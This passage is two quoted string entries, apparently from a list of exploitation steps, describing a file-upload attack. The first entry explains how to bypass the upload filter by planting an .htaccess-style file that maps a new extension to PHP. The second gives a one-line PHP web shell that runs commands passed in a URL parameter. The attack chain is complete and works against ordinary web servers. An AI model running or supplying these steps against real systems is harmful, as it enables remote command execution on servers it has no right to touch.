      `Discover the server's own web-root config file is uploadable (e.g. an .htaccess-equivalent) by probing which extensions are NOT blocked -- upload a file that adds a new handler, such as a config file containing 'AddType application/x-httpd-php .l33t', with a Content-Type of text/plain so it is accepted`,
      `Upload a second file named exploit.l33t containing <?php system($_GET['cmd']); ?> -- the server now executes .l33t files as PHP because of the config file you planted`,
